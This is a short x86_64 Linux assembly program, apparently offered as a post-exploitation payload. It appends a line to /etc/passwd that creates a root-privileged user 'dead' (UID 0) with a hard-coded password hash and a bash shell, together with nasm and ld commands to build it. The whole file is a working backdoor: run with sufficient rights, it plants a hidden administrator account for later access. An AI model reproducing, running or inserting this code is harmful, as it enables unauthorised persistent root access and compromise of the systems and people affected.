; author: mmxm
; linux/x86_64
; add new user root in /etc/passwd with password :D
; user=dead password=kennedys
; nasm -f elf64 add_root_user.asm
; ld -s -o add_root_user add_root_user.o

section .data
  SYS_WRITE equ 1
  SYS_OPEN equ 2
  SYS_CLOSE equ 3
  SYS_EXIT equ 60

  O_APPEND equ 2000o
  O_RDWR equ 2o

  filename db '/etc/passwd',0

  ; echo "dead:$(openssl passwd -1 "kennedys"):0:0::/:/bin/bash"
  pw db 'dead:$1$Kfi6mb/w$PLLXc8SRbZEyFKNkjX/mp1:0:0::/:/bin/bash',0xa
  pw_len equ $-pw

section .text
  global _start:

_start:
  mov rax, SYS_OPEN ; open("/etc/passwd", O_RDWR|O_APPEND , 0);
  mov rdi, filename
  mov rsi, O_RDWR|O_APPEND
  xor rdx, rdx
  syscall

  cmp rax, rdx ; if(rax < 0) goto end;
  jl end

  mov rdi, rax
  mov rax, SYS_WRITE
  mov rsi, pw
  mov dl, pw_len
  syscall

  mov rax, SYS_CLOSE
  syscall

end:
  mov rax, SYS_EXIT
  mov rdi, 0
  syscall
